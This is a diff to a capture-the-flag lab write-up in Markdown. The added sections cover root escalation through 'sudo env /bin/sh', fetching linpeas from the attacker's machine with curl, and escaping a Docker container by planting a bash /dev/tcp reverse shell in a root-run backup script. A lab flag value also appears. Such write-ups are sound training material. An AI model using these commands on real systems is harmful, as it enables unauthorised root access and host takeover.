@@ -651,6 +651,20 @@ THM{LF1_t0_RC3_aec3fb}
 ```
 
 
+## Getting root !!! 
+
+```
+sudo -l
+```
+
+```
+sudo env /bin/sh
+```
+
+<img width="914" height="377" alt="image" src="https://github.com/user-attachments/assets/3cd6a1de-3205-4684-ae99-7ed388759cf5" />
+
+
+<img width="629" height="148" alt="image" src="https://github.com/user-attachments/assets/1dd1dd2b-1400-4d2c-80da-aa86ed4b4b4a" />
 
 
 
@@ -659,17 +673,83 @@ THM{LF1_t0_RC3_aec3fb}
 
 
 
+## send linpeas
+
+> ### try with wget but command not found so i will try with curl
+
+```
+cd /tmp
+bash
+curl http://10.8.47.102:8888/linpeas.sh
+exit
+```
+
+<img width="803" height="257" alt="image" src="https://github.com/user-attachments/assets/511b5ea9-14c5-492d-abdc-e922b2eb6607" />
+
+## found
+
+<img width="1061" height="265" alt="image" src="https://github.com/user-attachments/assets/101c4ce0-1d86-445c-829c-84d6a1b8015c" />
+
+<img width="1124" height="214" alt="image" src="https://github.com/user-attachments/assets/c96779a5-c364-41e6-923e-c6999ec2dbfd" />
+
+
+---
+> ## interesting
+
+<img width="1104" height="141" alt="image" src="https://github.com/user-attachments/assets/96b03790-c68f-4562-b00c-fbbea80868af" />
+
+> ## also notice that we are in docker env
+
+<img width="944" height="495" alt="image" src="https://github.com/user-attachments/assets/03d21737-ed1c-4045-9854-258386911872" />
 
 
 
+## FOUND THE 4 FLAG (break out of a docker container.)
+
+
+> ## IN `/OPT`  FOUND FOLDER `backup` contain script let's edit it
+
+<img width="847" height="329" alt="image" src="https://github.com/user-attachments/assets/018c110b-f536-4095-b2f4-37fce06813cf" />
+
+
+```
+tar xvf backup.tar
+```
+
+> ## found container files
+
+<img width="841" height="660" alt="image" src="https://github.com/user-attachments/assets/a9bad894-8c03-4f85-afe8-52152b2fe0d7" />
+
+---
+
+
+```
+echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/10.8.47.102/9999 0>&1" >> backup.sh
+```
 
 
 
+<img width="1062" height="376" alt="image" src="https://github.com/user-attachments/assets/cec4ca8b-4b3a-426b-8f5f-1e7cca7d450d" />
 
+---
+---
 
-
-
-
+>[!note]
+> ### After we know that we are in container from **`.dockerenv`**
+> <img width="729" height="150" alt="image" src="https://github.com/user-attachments/assets/c021c362-eda4-45cd-afb7-1ec7fe70b0f6" />
+> ### and we found **`/opt/backups`** that have
+> - backup.sh
+> - backup.tar
+> ## in **`backup.sh`** we found this script
+> ```bash
+> #!/bin/bash
+> tar cf /root/container/backup/backup.tar /root/container
+> ```
+> here this script take backup from **`/root/container`** to **`backup.tar`** if you notice in our **`/root`** there is no **`container`** 
+> <img width="800" height="182" alt="image" src="https://github.com/user-attachments/assets/0bd96c4c-6aaa-48d2-a0b3-a4da7c56b67c" />
+>
+> so this is **`/root/container`** form the host not container so i add reveseshell and it bring us to host server
+> <img width="957" height="616" alt="image" src="https://github.com/user-attachments/assets/24e6b56f-2690-4c77-8be1-814dec480d78" />
 
 
 
